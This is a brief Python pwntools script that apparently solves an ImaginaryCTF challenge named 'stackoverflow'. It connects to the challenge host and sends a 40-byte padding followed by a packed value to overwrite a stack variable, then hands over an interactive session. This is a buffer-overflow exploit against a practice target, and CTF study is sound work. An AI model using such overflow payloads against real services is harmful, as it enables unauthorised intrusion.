from pwn import *

exe = ELF("stackoverflow")

context.binary = exe


def conn():
        if False:
                return process([exe.path])
        else:
                return remote("chal.imaginaryctf.org", 42001)


def main():
        r = conn()
        r.recvuntil("Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?")
        r.sendline(b'A'*40 + p64(0x69637466))
        r.interactive()


if __name__ == "__main__":
        main()
